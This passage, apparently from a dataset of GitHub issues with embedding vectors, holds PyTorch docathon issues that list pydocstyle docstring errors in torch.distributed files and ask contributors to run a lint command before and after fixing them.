  1.80079013e-01 -1.37416944e-02 -1.50681093e-01  1.22971028e-01
  2.82447040e-01  1.50256246e-01  2.71399379e-01 -7.07844719e-02
  9.79288667e-02  1.15803644e-01  1.64156333e-02 -3.01130772e-01
 -1.87739015e-01  1.62686676e-01  3.37271035e-01  1.05619974e-01
 -3.15049469e-01 -7.06274211e-02  1.63860485e-01  3.69747579e-02
 -8.68791267e-02 -5.02133131e-01  1.80208944e-02 -6.07185066e-02
  2.21990645e-01 -1.69076324e-01 -1.00713819e-01 -1.62586927e-01
  1.11736670e-01  3.33649337e-01  6.22245297e-02 -2.12283283e-02
  3.33213568e-01  2.50733435e-01  2.63702750e-01  1.76390365e-01
 -1.51373491e-01  2.91865896e-02  7.54823908e-02  2.18076602e-01
  3.08707077e-03 -2.23799258e-01 -3.82307529e-01 -6.34172559e-02
 -1.57172292e-01 -2.44862854e-01  1.04230739e-01  3.43473554e-01
  2.89200656e-02  1.44979894e-01 -2.67791629e-01 -9.73519832e-02
  2.65209973e-01 -2.90106535e-01 -6.90879524e-02  2.11201057e-01
  1.40842438e-01  2.79552162e-01 -2.22314894e-02 -2.82128453e-01
  7.06392601e-02  8.42075236e-03  3.44805360e-01  3.11878026e-01
  3.58557224e-01 -1.59055233e-01 -2.58458942e-01 -4.22213003e-02
  1.09545566e-01  1.34182110e-01  2.22365692e-01 -1.20333806e-01
 -5.80186211e-03 -6.60592616e-02  8.75379592e-02 -4.93293926e-02
  4.16140407e-02 -4.30058599e-01 -1.52533054e-01  2.63070166e-01
 -2.19698668e-01 -3.30874324e-02  3.90729457e-02 -9.41964239e-02
 -1.90986052e-01  2.71535039e-01  4.76429686e-02  2.92600930e-01
 -5.56696802e-02 -7.89825544e-02  5.03793247e-02 -4.06104699e-02
 -4.40017998e-01  3.08232188e-01 -9.66397524e-02  1.23752803e-01
  1.99540928e-01  1.02988943e-01  1.76738858e-01 -1.01115741e-02
  3.55803184e-02  3.39767337e-01  2.53849447e-01 -2.39348084e-01
  5.36251441e-02 -5.56632504e-02 -4.12767440e-01 -2.10419714e-01
 -1.31244838e-01  2.78487623e-01 -1.76903099e-01 -7.93303624e-02
  2.00611293e-01 -2.55675673e-01  1.40872538e-01  8.97725672e-02
  6.06425069e-02  8.60085804e-03  7.29015917e-02  1.62021995e-01
  4.41754870e-02 -3.39225292e-01  1.79685771e-01  1.35283500e-01
 -8.32298249e-02  2.78285056e-01  2.41945416e-01 -1.78277254e-01
 -1.26982942e-01 -5.48542812e-02 -1.45173401e-01  3.65625098e-02
 -1.58505529e-01  2.16209322e-01  1.61671732e-02 -2.89700031e-01
 -1.74470711e-02 -1.82744265e-01  6.63760081e-02  2.23660052e-01
  4.27595153e-02  1.54989541e-01  2.91512698e-01  2.18104944e-03
  2.70905308e-02  2.84408592e-02 -3.76682669e-01 -8.25692266e-02
 -3.06217521e-01 -2.53978848e-01 -5.01308739e-02 -1.92248255e-01
  9.02309120e-02 -4.29247946e-01 -2.75714576e-01 -4.96908315e-02
  1.45280555e-01  2.01617837e-01  1.81569114e-01 -1.86854824e-01
 -2.24511057e-01  1.39319569e-01  8.19021836e-02 -2.66275555e-01
  1.23802692e-01  1.12703638e-02 -1.04503997e-01  1.03960019e-02
 -4.15450722e-01 -3.40562239e-02  1.29685760e-01  7.60586374e-03
  4.21444446e-01 -5.52630723e-02  3.21779363e-02 -1.03667483e-01
 -8.29144195e-02 -1.47912931e-02 -4.17710423e-01  3.83707844e-02
  2.76099920e-01 -1.51186675e-01 -3.31926763e-01 -1.93578005e-01
  6.33214563e-02 -1.00005426e-01 -4.15927678e-01 -1.64727177e-02
  8.39181915e-02  1.78569034e-01 -2.71554887e-01  2.64409482e-01
  3.34275424e-01  2.42966503e-01 -2.57907689e-01  2.77781725e-01
 -8.14735591e-02  1.67411357e-01 -2.15139762e-01  3.40716839e-01
  1.85336441e-01  1.67243868e-01 -2.68064052e-01  1.46337315e-01
  3.15318376e-01 -6.45256788e-02 -5.41944444e-01 -1.97702557e-01
  1.34819523e-01 -6.90673143e-02  1.80821016e-01 -3.16011667e-01
 -1.69121236e-01 -5.92273809e-02  5.16469516e-02  4.67821121e-01
  8.15415680e-01 -5.11907816e-01  8.50137398e-02  1.82435319e-01
  1.39560550e-01  1.48749202e-01 -1.86389655e-01  8.92000422e-02
  1.35248512e-01 -2.94832945e-01  3.21846694e-01 -3.26672554e-01
 -2.53558189e-01 -2.53086269e-01 -2.62060761e-01  2.30953962e-01
 -1.77003086e-01  5.61758019e-02 -2.55240928e-02  2.63581052e-02
 -7.27116466e-02 -2.65841037e-01 -8.80261585e-02 -2.35363930e-01
  1.24391302e-01 -6.71984106e-02 -3.02033395e-01 -2.13840857e-01
 -1.50486141e-01  1.50084063e-01  2.19703466e-01  6.38013408e-02
  3.62307042e-01 -3.42442721e-01  1.47699863e-01  1.60750628e-01
  3.08869720e-01  2.82015562e-01 -3.03435139e-02  3.71518195e-01
 -1.35081694e-01  3.40720594e-01 -2.51197927e-02  6.21393770e-02
 -6.80536032e-02  1.71337985e-02 -6.20557219e-02  2.64484882e-01
  1.35111317e-01  4.66735631e-01 -1.17622480e-01  1.19980108e-02
 -4.24454138e-02 -4.41861413e-02  2.94158459e-01  3.58259469e-01
 -2.10410357e-01  6.78777620e-02 -1.15740523e-01 -6.42790943e-02
 -2.35696733e-01  1.81268215e-01 -1.33629054e-01 -1.01092070e-01
 -2.86054909e-01  8.89710039e-02 -1.81086123e-01  1.22756258e-01
 -1.27817333e-01 -4.41344231e-02  3.22913289e-01 -1.82254333e-03
  1.58467114e-01  2.06275284e-01 -3.68468374e-01  8.81683454e-02
 -2.32112497e-01 -2.87078083e-01 -3.80751640e-01  5.02849042e-01
  1.71078414e-01 -1.01019464e-01 -1.49862230e-01  1.80717066e-01
 -3.66476297e-01  1.22988030e-01 -2.23900065e-01  1.28959090e-01
  3.73125374e-01  8.45220163e-02  4.57505062e-02  2.63365898e-02
  3.03133965e-01 -1.14489347e-04  1.15225799e-01  1.17615439e-01
 -4.13446367e-01 -2.51874506e-01  2.63046443e-01 -2.39990279e-01
  8.89066607e-02 -1.74017563e-01 -1.43669873e-01  1.60239622e-01
 -7.58373365e-02  1.04999334e-01  4.04803157e-01 -3.58771011e-02]"
"Fix docstring errors in skippable.py, __init__.py, api.py, local_elastic_agent.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `stashable`, **Line**: 79, **Description**: First line should be in imperative mood (perhaps 'Iterate', not 'Iterates')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `poppable`, **Line**: 84, **Description**: First line should be in imperative mood (perhaps 'Iterate', not 'Iterates')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `isolate`, **Line**: 89, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `isolate`, **Line**: 89, **Description**: First line should end with a period (not 'a')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `dispatch`, **Line**: 152, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `dispatch`, **Line**: 152, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `forward`, **Line**: 183, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `forward`, **Line**: 183, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `forward`, **Line**: 183, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `skippable`, **Line**: 243, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `skippable`, **Line**: 243, **Description**: First line should end with a period (not 'p')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `skippable`, **Line**: 243, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/distributed/pipeline/sync/skip/skippable.py`, **Entity**: `verify_skippables`, **Line**: 350, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/distributed/elastic/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not '
- **File**: `torch/distributed/elastic/agent/server/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `WorkerSpec`, **Line**: 44, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_entrypoint_name`, **Line**: 101, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_entrypoint_name`, **Line**: 101, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `Worker`, **Line**: 113, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `Worker`, **Line**: 113, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `WorkerState`, **Line**: 187, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `is_running`, **Line**: 231, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `is_running`, **Line**: 231, **Description**: First line should end with a period (not '
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `is_running`, **Line**: 231, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `WorkerGroup`, **Line**: 240, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `WorkerGroup`, **Line**: 240, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_RoleInstanceInfo`, **Line**: 261, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `__init__`, **Line**: 271, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `__init__`, **Line**: 271, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `__init__`, **Line**: 271, **Description**: First line should end with a period (not '
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `RunResult`, **Line**: 320, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `RunResult`, **Line**: 320, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_get_socket_with_port`, **Line**: 353, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_get_socket_with_port`, **Line**: 353, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_get_socket_with_port`, **Line**: 353, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_get_socket_with_port`, **Line**: 353, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `ElasticAgent`, **Line**: 390, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `run`, **Line**: 426, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `run`, **Line**: 426, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `run`, **Line**: 426, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_worker_group`, **Line**: 441, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_worker_group`, **Line**: 441, **Description**: First line should end with a period (not '
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `get_worker_group`, **Line**: 441, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `SimpleElasticAgent`, **Line**: 453, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `SimpleElasticAgent`, **Line**: 453, **Description**: First line should end with a period (not ')')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_start_workers`, **Line**: 470, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_start_workers`, **Line**: 470, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_start_workers`, **Line**: 470, **Description**: First line should be in imperative mood (perhaps 'Start', not 'Starts')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_stop_workers`, **Line**: 480, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_stop_workers`, **Line**: 480, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_stop_workers`, **Line**: 480, **Description**: First line should be in imperative mood (perhaps 'Stop', not 'Stops')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_monitor_workers`, **Line**: 490, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_monitor_workers`, **Line**: 490, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_monitor_workers`, **Line**: 490, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_shutdown`, **Line**: 498, **Description**: First line should be in imperative mood (perhaps 'Clean', not 'Cleans')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_rendezvous`, **Line**: 538, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_rendezvous`, **Line**: 538, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_rendezvous`, **Line**: 538, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_assign_worker_ranks`, **Line**: 619, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_assign_worker_ranks`, **Line**: 619, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_assign_worker_ranks`, **Line**: 619, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_assign_worker_ranks`, **Line**: 619, **Description**: First line should be in imperative mood (perhaps 'Determine', not 'Determines')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_initialize_workers`, **Line**: 687, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_initialize_workers`, **Line**: 687, **Description**: First line should be in imperative mood (perhaps 'Start', not 'Starts')
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_restart_workers`, **Line**: 719, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_restart_workers`, **Line**: 719, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_exit_barrier`, **Line**: 923, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/api.py`, **Entity**: `_exit_barrier`, **Line**: 923, **Description**: First line should end with a period (not 'h')
- **File**: `torch/distributed/elastic/agent/server/local_elastic_agent.py`, **Entity**: `LocalElasticAgent`, **Line**: 47, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/elastic/agent/server/local_elastic_agent.py`, **Entity**: `LocalElasticAgent`, **Line**: 47, **Description**: First line should end with a period (not '`')

cc @carljparker",False,"[-0.11087103 -0.26242802 -0.02486633 -0.17052576  0.3312776  -0.18024969
 -0.08945971  0.09602928 -0.34388605  0.13816145  0.11286841  0.01869161
  0.12720385  0.26489583  0.02366615  0.06003287 -0.24392161 -0.46930403
  0.0991998   0.1891311   0.20174348  0.47458902 -0.07422203 -0.02482669
 -0.10668002 -0.00523749 -0.40035933 -0.26003712  0.00485357  0.1347074
  0.32791206  0.05405042 -0.28185576 -0.00383816  0.51573837  0.33265108
 -0.25103587 -0.15040441 -0.0086853   0.09278253  0.06318418 -0.16313437
 -0.15122667  0.03901172 -0.0183415  -0.15030938 -0.17826664  0.14058128
 -0.11871821  0.04923047 -0.08686829  0.03839951 -0.15833783 -0.02611439
  0.11979789 -0.10402961 -0.08248028  0.5563494  -0.05543176 -0.09013655
  0.17415324  0.16242829 -0.10345531  0.15906477 -0.12787056  0.41688842
  0.0379044   0.11903825  0.25667235  0.13410738 -0.23541035  0.02398404
 -0.4028276  -0.07106574  0.0653668   0.35777134 -0.38894874  0.06711657
 -0.25216022 -0.18619841 -0.16244513  0.03510159 -0.11703019  0.27913773
 -0.03724023 -0.04398987  0.18117496 -0.03987667  0.31275934 -0.01077485
  0.49194175 -0.08904473 -0.06796321  0.4098292   0.10852675  0.26384187
 -0.09922852 -0.01313557 -0.0032356  -0.15898763  0.06503859 -0.3038362
 -0.2542032   0.12463726  0.0183462   0.07115108  0.12374695  0.00501516
  0.19498837  0.05452582  0.0723996  -0.1454371   0.0747298   0.1654169
  0.21481779  0.18297482 -0.17449766 -0.03692061 -0.27611944 -0.02159683
  0.21049537  0.07877196 -0.01703268 -0.02614126  0.06153361  0.07957282
  0.294576   -0.00835298 -0.01396753 -0.18859074  0.11252259 -0.07376173
 -0.113061   -0.00732372  0.3428864   0.07215163 -0.17204419 -0.27817
  0.02235356  0.01262265 -0.22319308 -0.27262947 -0.2766148  -0.2472193
  0.27177274  0.37451267 -0.26166096  0.29507464  0.00274698  0.05558531
 -0.12349901  0.06004143 -0.26617453  0.48122996  0.02700145 -0.02470569
  0.49524242  0.09410179 -0.04573217 -0.3645567  -0.1036161   0.13379127
  0.00775726  0.03147463 -0.18324871  0.11143846 -0.26682678 -0.17389408
 -0.33149695 -0.17311132 -0.04276615  0.13503289 -0.04919439 -0.16249089
  0.25642803  0.22229762 -0.03410914 -0.2773072   0.12321354  0.18038519
  0.06948869  0.5409994   0.09539655  0.13116387 -0.24954633  0.04948326
  0.13516854 -0.21060474  0.2421753   0.30063325  0.04873478 -0.18966901
  0.19259216  0.02855141 -0.1053727   0.06693541  0.2990785   0.5174536
  0.05699514  0.25182402 -0.18131493  0.28233516  0.22184055 -0.08181702
  0.34688753 -0.06696364 -0.21480215 -0.37746763 -0.20015785  0.04565329
 -0.37698457 -0.11693332  0.03406508 -0.2928449  -0.26657605  0.2561
 -0.00779597 -0.3184936   0.2450251  -0.1216787  -0.4714193   0.04396908
 -0.18066704 -0.33519188  0.31355622  0.06987153  0.06996232 -0.00410465
 -0.02025372 -0.05425088  0.01587772  0.03457098  0.5979221  -0.05356742
  0.10024542  0.01059261 -0.0877483  -0.00159933  0.21009648  0.20404966
 -0.13695163 -0.21046193 -0.0395266  -0.08073549  0.14087899 -0.138133
 -0.13333651 -0.01415356 -0.3253531   0.26208985 -0.12497745 -0.37695307
 -0.01416859 -0.03410671  0.57044333  0.05565114 -0.27793267  0.05667711
 -0.14245272  0.16341805 -0.08893402  0.35311675 -0.10739215  0.15895721
  0.3154131  -0.21772346 -0.15886185  0.1911499  -0.22723839 -0.27079552
  0.24815461 -0.4757993   0.38805526  0.20927328  0.33998984  0.14498448
  0.44964594 -0.00619502  0.07803944  0.11559337 -0.14666048  0.4120108
 -0.5016731  -0.06993723  0.16783172 -0.0221724  -0.21908936 -0.21777385
 -0.4613746  -0.19878075 -0.1789505   0.1027185   0.16039085 -0.01024935
  0.00377933  0.18927631 -0.08782257  0.05448172  0.29521212  0.09820391
 -0.40197515 -0.0774488  -0.14273918  0.14802256 -0.04304579  0.25320387
  0.10544208  0.08864549  0.04014997 -0.34789073  0.24643381  0.36771342
 -0.19933343  0.21510407 -0.10563307  0.11255527  0.00180568  0.47381654
  0.05475036  0.02589558  0.02168913 -0.28081968 -0.18842724  0.08868291
  0.06309401  0.06287429 -0.41852605  0.19769078 -0.2777403  -0.28735286
  0.28280634 -0.05410377 -0.11420596 -0.04237473 -0.14765349 -0.14000884
 -0.15683454  0.25659594 -0.02826608 -0.40236837 -0.00699638 -0.2344431
  0.11571918 -0.64191085 -0.10463768 -0.05300724  0.17374605  0.24269447
 -0.36295527 -0.2516532   0.46613193 -0.03917684 -0.3506561   0.06923369
 -0.2648666   0.515796    0.09940458  0.18738863 -0.1511698   0.34623885
 -0.49038243  0.03021435 -0.12322365 -0.2949885  -0.07307563 -0.35474896
 -0.12210096 -0.02000858  0.22607265  0.04526692 -0.31494266  0.0942444
 -0.27841598  0.27536643  0.36325958  0.08115943  0.14838412  0.02173681
  0.04256886 -0.13382089 -0.50631595  0.20084128  0.45452493 -0.00840382]"
"Fix docstring errors in default_hooks.py, optimizer_overlap.py, checkpoint_wrapper.py, copy.py, benchmark_ddp_rpc.py, utils.py, dependency.py, phony.py, pipeline.py, checkpoint.py, worker.py, batchnorm.py, quantization.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `ActivationWrapper`, **Line**: 22, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `named_parameters`, **Line**: 58, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `named_parameters`, **Line**: 58, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `named_parameters`, **Line**: 58, **Description**: First line should be in imperative mood (perhaps 'Override', not 'Overrides')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `named_parameters`, **Line**: 58, **Description**: First line should not be the function's ""signature""
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_post_state_dict_hook`, **Line**: 72, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_post_state_dict_hook`, **Line**: 72, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_post_state_dict_hook`, **Line**: 72, **Description**: First line should not be the function's ""signature""
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_pre_load_state_dict_hook`, **Line**: 90, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `_pre_load_state_dict_hook`, **Line**: 90, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `CheckpointWrapper`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `CheckpointWrapper`, **Line**: 109, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `offload_wrapper`, **Line**: 173, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `offload_wrapper`, **Line**: 173, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `offload_wrapper`, **Line**: 173, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `checkpoint_wrapper`, **Line**: 200, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `checkpoint_wrapper`, **Line**: 200, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `checkpoint_wrapper`, **Line**: 200, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `checkpoint_wrapper`, **Line**: 200, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `apply_activation_checkpointing`, **Line**: 252, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `apply_activation_checkpointing`, **Line**: 252, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_checkpoint/checkpoint_wrapper.py`, **Entity**: `apply_activation_checkpointing`, **Line**: 252, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `__init__`, **Line**: 36, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `__init__`, **Line**: 36, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `__init__`, **Line**: 36, **Description**: First word of the first line should be properly capitalized ('Overlappedoptimizer', not 'OverlappedOptimizer')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `register_ddp`, **Line**: 43, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `register_fsdp`, **Line**: 49, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `_as_overlapped_optim`, **Line**: 76, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/algorithms/_optimizer_overlap/optimizer_overlap.py`, **Entity**: `_as_overlapped_optim`, **Line**: 76, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `DefaultState`, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `DefaultState`, **Line**: 7, **Description**: First line should end with a period (not 'm')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `LowPrecisionState`, **Line**: 44, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `LowPrecisionState`, **Line**: 44, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `_decompress`, **Line**: 69, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `_decompress`, **Line**: 69, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `allreduce_hook`, **Line**: 79, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `allreduce_hook`, **Line**: 79, **Description**: First line should end with a period (not 'm')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `allreduce_hook`, **Line**: 79, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `reduce_scatter_hook`, **Line**: 98, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `reduce_scatter_hook`, **Line**: 98, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `reduce_scatter_hook`, **Line**: 98, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
